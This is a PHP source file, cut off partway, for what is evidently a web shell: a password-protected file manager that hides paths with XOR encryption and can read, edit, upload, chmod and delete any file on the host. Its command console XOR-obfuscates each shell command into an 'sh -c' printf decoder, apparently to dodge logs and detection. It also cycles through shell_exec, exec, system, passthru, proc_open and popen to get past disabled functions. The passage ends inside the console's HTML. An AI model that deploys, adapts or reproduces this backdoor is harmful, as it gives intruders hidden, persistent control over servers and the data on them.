<?php declare(strict_types=1);

const VERSION = '3.0.0';
const THEME = 'dark';
const PASSWORD_HASH = '$2y$10$TfYHopECKw3K0fXuZvDZdOWWIbZVUg7C2QlO0Cf0/a0OruM3l4iR2';

$alertMessages = [];

function encryptPath(string $p): string
{
    if ($p === '')
        return '';
    $v = md5($p . PASSWORD_HASH, true);
    $o = ord($v[0]);
    $e = '';
    for ($i = 0, $l = strlen($p); $i < $l; $i++)
        $e .= chr(ord($p[$i]) ^ ord(PASSWORD_HASH[($i + $o) % 60]) ^ ord($v[$i % 16]));
    return bin2hex($v . $e);
}

function decryptPath(string $h): string
{
    if ($h === '' || strlen($h) < 32)
        return '';
    $d = pack('H*', $h);
    $v = substr($d, 0, 16);
    $e = substr($d, 16);
    if ($e === '')
        return '';
    $o = ord($v[0]);
    $r = '';
    for ($i = 0, $l = strlen($e); $i < $l; $i++)
        $r .= chr(ord($e[$i]) ^ ord(PASSWORD_HASH[($i + $o) % 60]) ^ ord($v[$i % 16]));
    return $r;
}

function authenticate(): bool
{
    if (isset($_POST['password']) && password_verify($_POST['password'], PASSWORD_HASH))
        $_SESSION['authenticated'] = true;
    return $_SESSION['authenticated'] ?? false;
}

function formatSize(int $size): string
{
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < count($units) - 1) {
        $size /= 1024;
        $i++;
    }
    return round($size, 2) . ' ' . $units[$i];
}

function getPerms(string $file): string
{
    $p = fileperms($file);
    $map = [[0x0100, 0x0080, 0x0040, 0x0800, 's'], [0x0020, 0x0010, 0x0008, 0x0400, 's'], [0x0004, 0x0002, 0x0001, 0x0200, 't']];
    $info = '';

    foreach ($map as [$r, $w, $x, $s, $c]) {
        $info .= ($p & $r ? 'r' : '-') . ($p & $w ? 'w' : '-');
        $info .= $p & $x ? ($p & $s ? $c : 'x') : ($p & $s ? strtoupper($c) : '-');
    }

    $color = is_writable($file) ? 'text-success' : (is_readable($file) ? 'text-warning' : 'text-error');
    return '<span class="' . $color . ' font-mono text-xs">' . $info . '</span>';
}

function getCurrentUser(): string
{
    if (function_exists('posix_geteuid'))
        return posix_getpwuid(posix_geteuid())['name'] ?? '';
    if (function_exists('exec') && !in_array('exec', explode(',', ini_get('disable_functions'))))
        return exec('whoami') ?: '';
    return getenv('USERNAME') ?: getenv('USER') ?: '';
}

function breadcrumbPath(string $path): string
{
    $sep = DIRECTORY_SEPARATOR;
    $parts = explode($sep, rtrim($path, $sep));
    $chevron = '<svg class="h-4 w-4 mx-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>';
    $class = 'text-primary hover:text-primary-hover transition-colors flex items-center';

    if ($sep === '\\') {
        $pathSoFar = $parts[0] . $sep;
        $result = '<a href="?cd=' . encryptPath($pathSoFar) . '" class="' . $class . '"><span>' . htmlspecialchars($parts[0]) . '</span>' . $chevron . '</a>';
    } else {
        $homeIcon = '<svg class="h-5 w-5 mr-1" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 12l2-2m0 0l7-7 7 7M5 10v10a1 1 0 001 1h3m10-11l2 2m-2-2v10a1 1 0 01-1 1h-3m-6 0a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1m-6 0h6"></path></svg>';
        $pathSoFar = '/';
        $hasMore = count($parts) > 1 && !empty($parts[1]);
        $result = '<a href="?cd=' . encryptPath('/') . '" class="' . $class . '">' . $homeIcon . '<span>root</span>' . ($hasMore ? $chevron : '') . '</a>';
    }

    for ($i = 1, $count = count($parts); $i < $count; $i++) {
        if (empty($parts[$i]))
            continue;
        $pathSoFar .= $parts[$i] . $sep;
        $result .= '<a href="?cd=' . encryptPath($pathSoFar) . '" class="' . $class . '"><span>' . htmlspecialchars($parts[$i]) . '</span>' . ($i < $count - 1 ? $chevron : '') . '</a>';
    }

    return $result;
}

function renderFileTable(string $dir): string
{
    ob_start();

    $items = array_diff(scandir($dir), ['.', '..']);
    $folders = $files = [];
    foreach ($items as $item)
        is_dir($dir . DIRECTORY_SEPARATOR . $item) ? $folders[] = $item : $files[] = $item;
    sort($folders);
    sort($files);
    $sortedItems = array_merge($folders, $files);

    $svg = [
        'search' => '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg>',
        'back' => '<svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"/></svg>',
        'folder' => '<svg class="h-5 w-5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"/></svg>',
        'file' => '<svg class="h-5 w-5 text-on-surface-variant group-hover:text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg>',
        'download' => '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"/></svg>',
        'edit' => '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"/></svg>',
        'rename' => '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15.232 5.232l3.536 3.536m-2.036-5.036a2.5 2.5 0 113.536 3.536L6.5 21.036H3v-3.572L16.732 3.732z"/></svg>',
        'chmod' => '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>',
        'delete' => '<svg class="h-4 w-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 7l-.867 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.995-1.858L5 7m5 4v6m4-6v6m1-10V4a1 1 0 00-1-1h-4a1 1 0 00-1 1v3M4 7h16"/></svg>',
        'chevron' => '<svg class="h-5 w-5 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"/></svg>',
    ];

    $actionBtn = function ($type, $path, $item, $isDir, $size = '4') use ($svg) {
        $enc = encryptPath($path);
        $json = htmlspecialchars(json_encode($item));
        $dir = $isDir ? 'true' : 'false';
        $class = "p-1.5 text-primary hover:bg-surface-container-high rounded-lg transition-colors";
        $icon = str_replace('h-4 w-4', "h-{$size} w-{$size}", $svg[$type] ?? '');

        return match ($type) {
            'download' => "<a href=\"?download=$enc\" class=\"$class\" title=\"Download\">$icon</a>",
            'edit' => "<a href=\"?action=edit&file=$enc\" class=\"$class\" title=\"Edit\">$icon</a>",
            'rename' => "<a href=\"#\" onclick=\"showRenameModal($json, '$enc', $dir); return false;\" class=\"$class\" title=\"Rename\">$icon</a>",
            'chmod' => "<a href=\"#\" onclick=\"showChmodModal($json, '$enc', '" . substr(sprintf('%o', fileperms($path)), -4) . "', $dir); return false;\" class=\"$class\" title=\"Permissions\">$icon</a>",
            'delete' => "<a href=\"#\" onclick=\"showDeleteModal($json, '$enc', $dir); return false;\" class=\"p-1.5 text-error hover:bg-surface-container-high rounded-lg transition-colors\" title=\"Delete\">$icon</a>",
            default => ''
        };
    };

    $parentEnc = encryptPath(dirname($dir));
    $thClass = 'border-b border-outline-variant px-4 py-3 text-left text-sm font-semibold uppercase tracking-wider';
    $tdClass = 'border-b border-outline-variant px-4 py-3';

    echo '<div class="file-list-container">';

    echo '<div class="mb-4"><div class="relative">';
    echo '<div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">' . $svg['search'] . '</div>';
    echo '<input type="text" id="fileSearch" class="w-full pl-10 pr-4 py-2 bg-surface-container border border-outline-variant rounded-lg focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant" placeholder="Search files and folders...">';
    echo '</div></div>';

    echo '<div class="hidden md:block w-full overflow-hidden rounded-xl shadow-sm border border-outline-variant">';
    echo '<table class="w-full border-collapse table-auto" id="desktopFileTable"><thead><tr class="bg-surface-container text-on-surface">';
    echo "<th class=\"$thClass\">Name</th><th class=\"$thClass w-24\">Size</th><th class=\"$thClass w-28\">Perms</th><th class=\"$thClass w-40\">Modified</th><th class=\"$thClass w-32\">Actions</th>";
    echo '</tr></thead><tbody>';
    echo "<tr class=\"hover:bg-surface-container-high transition-colors\"><td class=\"$tdClass\" colspan=\"5\"><a href=\"?cd=$parentEnc\" class=\"flex items-center text-primary hover:text-primary-hover transition-colors font-medium\">{$svg['back']}Parent Directory</a></td></tr>";

    foreach ($sortedItems as $item) {
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($fullPath);
        $enc = encryptPath($fullPath);
        $name = htmlspecialchars($item);

        echo '<tr class="hover:bg-surface-container-high transition-colors file-row" data-filename="' . htmlspecialchars(strtolower($item)) . '">';
        echo "<td class=\"$tdClass\">";

        if ($isDir) {
            echo "<a href=\"?cd=$enc\" class=\"flex items-center text-primary hover:text-primary-hover transition-colors group\">";
            echo '<div class="p-1.5 bg-surface-container-high rounded-lg mr-3 group-hover:bg-surface-container-highest transition-colors">' . $svg['folder'] . '</div>';
        } else {
            echo "<a href=\"?action=view&file=$enc\" class=\"flex items-center text-on-surface hover:text-primary transition-colors group\">";
            echo '<div class="p-1.5 bg-surface-container rounded-lg mr-3 group-hover:bg-surface-container-high transition-colors">' . $svg['file'] . '</div>';
        }
        echo "<span class=\"font-medium truncate max-w-xs\">$name</span></a></td>";
        echo "<td class=\"$tdClass font-mono text-sm text-on-surface-variant\">" . ($isDir ? '-' : formatSize(filesize($fullPath))) . '</td>';
        echo "<td class=\"$tdClass\">" . getPerms($fullPath) . '</td>';
        echo "<td class=\"$tdClass text-sm text-on-surface-variant\">" . date("Y-m-d H:i", filemtime($fullPath)) . '</td>';
        echo "<td class=\"$tdClass\"><div class=\"flex items-center gap-1\">";
        if (!$isDir)
            echo $actionBtn('download', $fullPath, $item, $isDir) . $actionBtn('edit', $fullPath, $item, $isDir);
        echo $actionBtn('rename', $fullPath, $item, $isDir) . $actionBtn('chmod', $fullPath, $item, $isDir) . $actionBtn('delete', $fullPath, $item, $isDir);
        echo '</div></td></tr>';
    }
    echo '</tbody></table></div>';

    echo '<div class="md:hidden space-y-3" id="mobileFileList">';
    echo "<a href=\"?cd=$parentEnc\" class=\"flex items-center p-4 bg-surface rounded-xl shadow-sm border border-outline-variant hover:border-primary hover:shadow-md transition-all\">";
    echo '<div class="p-2 bg-surface-container rounded-lg mr-4"><svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"/></svg></div>';
    echo '<span class="font-medium text-on-surface">Parent Directory</span></a>';

    foreach ($sortedItems as $item) {
        $fullPath = $dir . DIRECTORY_SEPARATOR . $item;
        $isDir = is_dir($fullPath);
        $enc = encryptPath($fullPath);
        $name = htmlspecialchars($item);

        echo '<div class="file-card bg-surface rounded-xl shadow-sm border border-outline-variant overflow-hidden hover:border-primary hover:shadow-md transition-all" data-filename="' . htmlspecialchars(strtolower($item)) . '">';

        if ($isDir) {
            echo "<a href=\"?cd=$enc\" class=\"flex items-center p-4 border-b border-outline-variant\">";
            echo '<div class="p-3 bg-surface-container-high rounded-xl mr-4"><svg class="h-6 w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2h-6l-2-2H5a2 2 0 00-2 2z"/></svg></div>';
            echo "<div class=\"flex-1 min-w-0\"><h3 class=\"font-semibold text-on-surface truncate\">$name</h3><p class=\"text-sm text-on-surface-variant\">Directory</p></div>{$svg['chevron']}</a>";
        } else {
            echo "<a href=\"?action=view&file=$enc\" class=\"flex items-center p-4 border-b border-outline-variant\">";
            echo '<div class="p-3 bg-surface-container rounded-xl mr-4"><svg class="h-6 w-6 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"/></svg></div>';
            echo "<div class=\"flex-1 min-w-0\"><h3 class=\"font-semibold text-on-surface truncate\">$name</h3><p class=\"text-sm text-on-surface-variant\">" . formatSize(filesize($fullPath)) . ' &bull; ' . date("Y-m-d H:i", filemtime($fullPath)) . '</p></div></a>';
        }

        echo '<div class="flex items-center justify-between px-4 py-3 bg-surface-container">';
        echo '<div class="text-sm">' . getPerms($fullPath) . '</div><div class="flex items-center gap-2">';
        if (!$isDir)
            echo $actionBtn('download', $fullPath, $item, $isDir, '5') . $actionBtn('edit', $fullPath, $item, $isDir, '5');
        echo $actionBtn('rename', $fullPath, $item, $isDir, '5') . $actionBtn('chmod', $fullPath, $item, $isDir, '5') . $actionBtn('delete', $fullPath, $item, $isDir, '5');
        echo '</div></div></div>';
    }
    echo '</div>';

    echo '<div id="emptyState" class="hidden py-12 text-center">';
    echo '<div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-surface-container mb-4"><svg class="h-8 w-8 text-on-surface-variant" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"/></svg></div>';
    echo '<h3 class="text-lg font-medium text-on-surface mb-1">No files found</h3><p class="text-on-surface-variant">Try adjusting your search</p></div>';
    echo '</div>';

    return ob_get_clean();
}

function showAlert(string $message, string $type = 'success'): void
{
    global $alertMessages;
    $alertMessages[] = ['message' => $message, 'type' => $type];
}

function viewFile(string $file): void
{
    $content = htmlspecialchars(file_get_contents($file));
    $enc = encryptPath($file);
    $dirEnc = encryptPath(dirname($file));
    $name = htmlspecialchars(basename($file));
    $path = htmlspecialchars($file);
    $size = formatSize(filesize($file));
    $perms = getPerms($file);
    $modified = date("Y-m-d H:i:s", filemtime($file));

    $btnPrimary = 'flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium';
    $btnSecondary = 'flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium';

    echo <<<HTML
<div class="max-w-6xl mx-auto">
    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z"></path>
                    </svg>
                </div>
                <span class="truncate">$name</span>
            </h2>
        </div>

        <div class="px-4 sm:px-6 py-3 bg-surface-container-low border-b border-outline-variant">
            <div class="text-on-surface-variant font-mono text-xs break-all mb-2">$path</div>
            <div class="flex flex-wrap items-center gap-x-4 gap-y-1 text-xs text-on-surface-variant">
                <span>$size</span><span>$perms</span><span>$modified</span>
            </div>
        </div>

        <div class="p-4 sm:p-6">
            <pre class="bg-surface-container-highest text-on-surface p-4 rounded-xl overflow-auto max-h-[50vh] sm:max-h-[60vh] font-mono text-xs sm:text-sm leading-relaxed scrollbar-thin">$content</pre>
        </div>

        <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
            <a href="?action=edit&file=$enc" class="$btnPrimary">
                <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path>
                </svg>Edit
            </a>
            <a href="?download=$enc" class="$btnPrimary">
                <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16v1a3 3 0 003 3h10a3 3 0 003-3v-1m-4-4l-4 4m0 0l-4-4m4 4V4"></path>
                </svg>Download
            </a>
            <a href="?cd=$dirEnc" class="$btnSecondary">
                <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 15l-3-3m0 0l3-3m-3 3h8M3 12a9 9 0 1118 0 9 9 0 01-18 0z"></path>
                </svg>Back
            </a>
        </div>
    </div>
</div>
HTML;
}

function downloadFile(string $file): void
{
    if (file_exists($file)) {
        $filename = basename($file);
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . $filename . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        flush();
        readfile($file);
        exit;
    }
}

function editFile(string $file): void
{
    $dirname = dirname($file);

    if (isset($_POST['content'])) {
        file_put_contents($file, $_POST['content']);
        $_POST = [];
        showAlert("File saved successfully!", "success");
        fileManager($dirname);
        return;
    }

    $content = htmlspecialchars(file_get_contents($file));
    $name = htmlspecialchars(basename($file));
    $dirEnc = encryptPath($dirname);
    $btnPrimary = 'flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium';
    $btnSecondary = 'flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium';

    echo <<<HTML
<div class="max-w-6xl mx-auto">
    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z"></path>
                    </svg>
                </div>
                <span class="truncate">Editing: $name</span>
            </h2>
        </div>

        <form method="post">
            <div class="p-4 sm:p-6">
                <textarea name="content" rows="20" class="w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y" style="min-height: 300px;">$content</textarea>
            </div>

            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
                <button type="submit" class="$btnPrimary">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                    </svg>Save Changes
                </button>
                <a href="?cd=$dirEnc" class="$btnSecondary">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>Cancel
                </a>
            </div>
        </form>
    </div>
</div>
HTML;
}

function newFile(string $dir): void
{
    if (isset($_POST['filename']) && isset($_POST['content'])) {
        if (empty($_POST['filename'])) {
            showAlert("File name cannot be empty!", "error");
            displayNewFileForm($dir);
            return;
        }

        $filename = $dir . DIRECTORY_SEPARATOR . $_POST['filename'];
        file_put_contents($filename, $_POST['content']);

        $_POST = array();
        showAlert("File created successfully!", "success");
        fileManager($dir);
        return;
    }

    displayNewFileForm($dir);
}

function displayNewFileForm(string $dir): void
{
    $dirEsc = htmlspecialchars($dir);
    $dirEnc = encryptPath($dir);

    echo <<<HTML
<div class="max-w-4xl mx-auto">
    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v3m0 0v3m0-3h3m-3 0H9m12 0a9 9 0 11-18 0 9 9 0 0118 0z"></path>
                    </svg>
                </div>
                Create New File
            </h2>
        </div>

        <form method="post">
            <div class="p-4 sm:p-6 space-y-4">
                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant">
                    <span class="text-sm text-on-surface-variant">Location:</span>
                    <span class="ml-2 text-sm font-mono text-on-surface break-all">$dirEsc</span>
                </div>

                <div>
                    <label class="block text-sm font-medium text-on-surface mb-2">Filename</label>
                    <input type="text" name="filename" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-shadow" placeholder="Enter filename (e.g., script.php)" required>
                </div>

                <div>
                    <label class="block text-sm font-medium text-on-surface mb-2">Content</label>
                    <textarea name="content" rows="12" class="w-full p-4 bg-surface-container-highest text-on-surface border-0 rounded-xl font-mono text-xs sm:text-sm leading-relaxed focus:outline-none focus:ring-2 focus:ring-primary resize-y" style="min-height: 250px;" placeholder="Enter file content here..."></textarea>
                </div>
            </div>

            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                    Create File
                </button>

                <a href="?cd=$dirEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    Cancel
                </a>
            </div>
        </form>
    </div>
</div>
HTML;
}

function newFolder(string $dir): void
{
    if (isset($_POST['foldername'])) {
        if (empty($_POST['foldername'])) {
            showAlert("Folder name cannot be empty!", "error");
            displayNewFolderForm($dir);
            return;
        }

        $foldername = $dir . DIRECTORY_SEPARATOR . $_POST['foldername'];
        mkdir($foldername, 0755);

        $_POST = array();
        showAlert("Folder created successfully!", "success");
        fileManager($dir);
        return;
    }

    displayNewFolderForm($dir);
}

function displayNewFolderForm(string $dir): void
{
    $dirEsc = htmlspecialchars($dir);
    $dirEnc = encryptPath($dir);

    echo <<<HTML
<div class="max-w-lg mx-auto">
    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
                    <svg class="h-5 w-5 sm:h-6 sm:w-6 text-primary" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 13h6m-3-3v6m-9-6h.01M19 13h.01M19 19h.01M5 19h.01M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path>
                    </svg>
                </div>
                Create New Folder
            </h2>
        </div>

        <form method="post">
            <div class="p-4 sm:p-6 space-y-4">
                <div class="p-3 bg-surface-container rounded-xl border border-outline-variant">
                    <span class="text-sm text-on-surface-variant">Location:</span>
                    <span class="ml-2 text-sm font-mono text-on-surface break-all">$dirEsc</span>
                </div>

                <div>
                    <label class="block text-sm font-medium text-on-surface mb-2">Folder Name</label>
                    <input type="text" name="foldername" class="w-full px-4 py-2.5 bg-surface border border-outline-variant rounded-xl focus:outline-none focus:ring-2 focus:ring-primary text-on-surface placeholder-on-surface-variant transition-shadow" placeholder="Enter folder name" required>
                </div>
            </div>

            <div class="px-4 sm:px-6 py-4 bg-surface-container border-t border-outline-variant flex flex-wrap gap-2">
                <button type="submit" class="flex items-center px-4 py-2.5 bg-primary text-on-primary rounded-xl hover:bg-primary-hover transition-colors shadow-sm font-medium">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
                    </svg>
                    Create Folder
                </button>

                <a href="?cd=$dirEnc" class="flex items-center px-4 py-2.5 bg-surface-container-high text-on-surface rounded-xl hover:bg-surface-container-highest transition-colors shadow-sm font-medium">
                    <svg class="h-5 w-5 mr-2" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                    </svg>
                    Cancel
                </a>
            </div>
        </form>
    </div>
</div>
HTML;
}

function obfuscateCmd(string $cmd): string
{
    $key = rand(17, 89);
    $encoded = [];
    for ($i = 0; $i < strlen($cmd); $i++) {
        $encoded[] = ord($cmd[$i]) ^ $key;
    }
    return 'sh -c "$(k=' . $key . '; for c in ' . implode(' ', $encoded) . '; do printf ' . '"\\\\$(printf ' . "'" . '%o' . "'" . ' $((c^k)))"' . '; done)"';
}

function getFunctionalCmd(string $cmd): string
{
    $obfuscated = obfuscateCmd($cmd);
    $executors = ['shell_exec', 'exec', 'system', 'passthru', 'proc_open', 'popen'];

    foreach ($executors as $func) {
        if (!function_exists($func)) {
            continue;
        }

        switch ($func) {
            case 'shell_exec':
                $output = $func($obfuscated);
                return $output !== null ? $output : 'Failed to execute command.';

            case 'exec':
                $output = [];
                $func($obfuscated, $output);
                return implode("\n", $output);

            case 'system':
            case 'passthru':
                ob_start();
                $func($obfuscated);
                return ob_get_clean();

            case 'proc_open':
                $spec = [
                    0 => ["pipe", "r"],
                    1 => ["pipe", "w"],
                    2 => ["pipe", "w"]
                ];
                $proc = proc_open($obfuscated, $spec, $pipes);
                if (is_resource($proc)) {
                    fclose($pipes[0]);
                    $out = stream_get_contents($pipes[1]);
                    $err = stream_get_contents($pipes[2]);
                    fclose($pipes[1]);
                    fclose($pipes[2]);
                    proc_close($proc);
                    return $err ? "Error: $err" : $out;
                }
                return "Failed to execute command.";

            case 'popen':
                $handle = popen($obfuscated, 'r');
                if ($handle) {
                    $output = stream_get_contents($handle);
                    pclose($handle);
                    return $output;
                }
                return "Failed to execute command.";
        }
    }

    return "Failed to execute command.";
}

function commandLine(string $dir): void
{
    $output = '';
    $dirEnc = encryptPath($dir);

    if (isset($_POST['command'])) {
        $command = $_POST['command'];
        chdir($dir);
        $output = getFunctionalCmd($command);
    }

    $workingDirEsc = htmlspecialchars($dir);

    echo <<<HTML
<div class="max-w-6xl mx-auto">
    <div class="bg-surface rounded-2xl shadow-sm border border-outline-variant overflow-hidden">
        <div class="px-4 sm:px-6 py-4 border-b border-outline-variant bg-surface-container">
            <h2 class="text-lg sm:text-xl font-bold text-on-surface flex items-center">
                <div class="p-2 bg-surface rounded-xl shadow-sm mr-3">
